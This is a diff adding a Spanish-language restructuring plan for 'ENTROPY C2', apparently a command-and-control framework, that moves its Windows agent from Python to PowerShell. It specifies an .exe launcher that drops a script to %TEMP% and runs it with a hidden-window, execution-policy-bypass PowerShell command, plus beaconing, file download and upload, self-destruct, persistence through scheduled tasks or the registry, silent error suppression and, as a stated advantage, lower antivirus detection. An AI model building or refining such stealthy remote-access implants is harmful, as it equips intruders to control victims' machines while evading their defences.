@@ -1,0 +1,64 @@
+ENTROPY C2 - Plan de reestructuración
+======================================
+Author: jdb / httpbnry
+
+Problema: el agente Windows requiere Python + cryptography,
+que no vienen preinstalados en Windows.
+
+Solución: migrar a PowerShell (nativo en Windows 7+).
+
+
+Fase 1 - Crypto (modules/crypto.py)
+------------------------------------
+Cambiar de Fernet (solo Python) a AES-128-CBC con HMAC.
+    - Compatible Python ↔ PowerShell
+    - Misma API: encrypt(key, data) / decrypt(key, data)
+    - El handler se mantiene igual (solo cambia crypto.py)
+
+
+Fase 2 - Windows Agent en PowerShell
+-------------------------------------
+El .exe (mingw-w64) lanzara:
+    powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TEMP%\e.ps1"
+
+El script .ps1 debe implementar:
+    - Socket TCP con System.Net.Sockets.TcpClient
+    - Cifrado AES-128-CBC con System.Security.Cryptography.Aes
+    - Protocolo length-prefixed (4 bytes + datos)
+    - Beacon al conectar
+    - Comandos especiales: ping, info, download, upload, selfdestruct
+    - Persistencia via Scheduled Task o registry
+    - Reconexion cada 30s
+    - Captura total de errores (try/catch silencioso)
+
+
+Fase 3 - Linux Agent
+---------------------
+Actualizar templates para usar AES-128-CBC (misma libreria cryptography).
+Cambio minimo: fernet.Fernet → AES manual con cryptography.hazmat.
+
+
+Fase 4 - Handler
+-----------------
+Minimos cambios. El handler usa crypto.py de forma abstracta.
+    - Protocolo y prompts se mantienen identicos.
+    - Solo cambiar import de crypto.
+
+
+Fase 5 - .exe Launcher (mingw-w64)
+-----------------------------------
+El launcher actual escribe .py a temp.
+Cambiar a:
+    1. Escribir script PowerShell a %TEMP%\e.ps1
+    2. Ejecutar:
+       powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TEMP%\e.ps1"
+    3. No necesita Python ni nada mas.
+
+
+Ventajas del nuevo enfoque
+--------------------------
+- Sin dependencias externas en Windows
+- .exe pequeno (~47KB con mingw)
+- Menor deteccion AV (PowerShell nativo vs PyInstaller)
+- Script en temp, facil de limpiar
+- Mismas capacidades: ping, info, download, upload, selfdestruct
